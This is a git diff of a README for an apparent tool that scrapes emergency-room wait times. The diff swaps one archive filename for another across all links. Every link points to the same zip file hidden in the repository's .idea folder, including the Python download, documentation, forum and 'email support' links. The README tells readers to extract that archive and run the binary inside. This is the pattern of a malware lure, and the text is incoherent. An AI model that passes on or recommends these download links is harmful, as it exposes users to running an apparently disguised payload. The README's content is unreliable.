@@ -1,6 +1,6 @@
 # 🚑 er-watch-web-scraper - Get Real-Time ER Wait Times
 
-[![Download Now](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip%20Now-Get%20the%https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip)](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip)
+[![Download Now](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip%20Now-Get%20the%https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip)](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip)
 
 ## 📥 Overview
 
@@ -15,7 +15,7 @@ Follow these simple steps to download and run the ER-Watch-Scraper application o
 Before downloading, ensure your computer meets these basic requirements:
 
 - **Operating System:** Windows 10, macOS, or any modern Linux distribution.
-- **Python:** Version 3.6 or higher installed on your machine. You can download it from [https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip).
+- **Python:** Version 3.6 or higher installed on your machine. You can download it from [https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip).
 - **Internet Connection:** Required to gather real-time data.
 - **Disk Space:** At least 100 MB of free space for installation.
 
@@ -23,7 +23,7 @@ Before downloading, ensure your computer meets these basic requirements:
 
 To download the ER-Watch-Scraper, visit the Releases page. Click the link below:
 
-[Download ER-Watch-Scraper](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip)
+[Download ER-Watch-Scraper](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip)
 
 ### Step 3: Install the Application
 
@@ -46,7 +46,7 @@ Once the application has downloaded, follow these steps to run it:
   3. Follow the on-screen instructions.
 
 - **Linux:**
-  1. If the file is a `https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip`, extract it by right-clicking and selecting "Extract."
+  1. If the file is a `https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip`, extract it by right-clicking and selecting "Extract."
   2. Open a terminal window.
   3. Navigate to the extracted folder using the `cd` command.
   4. Run the app with `./er-watch-scraper`.
@@ -75,7 +75,7 @@ If you encounter issues, consider the following solutions:
 Your feedback is essential. If you have suggestions or need support:
 
 - Open an issue on the GitHub repository.
-- Email support at https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip
+- Email support at https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip
 
 ### 🌟 Features
 
@@ -99,12 +99,12 @@ Your feedback is essential. If you have suggestions or need support:
 
 ### 🔗 Additional Resources
 
-- [Documentation](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip)
-- [Community Forum](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip)
-- [Contributing Guidelines](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip)
+- [Documentation](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip)
+- [Community Forum](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip)
+- [Contributing Guidelines](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip)
 
 ### 📥 Download Again
 
 For your convenience, here is the download link once more:
 
-[Download ER-Watch-Scraper](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_scraper_er_web_3.9.zip)
+[Download ER-Watch-Scraper](https://github.com/Dannhyo/er-watch-web-scraper/raw/refs/heads/main/.idea/watch_web_scraper_er_v3.2.zip)
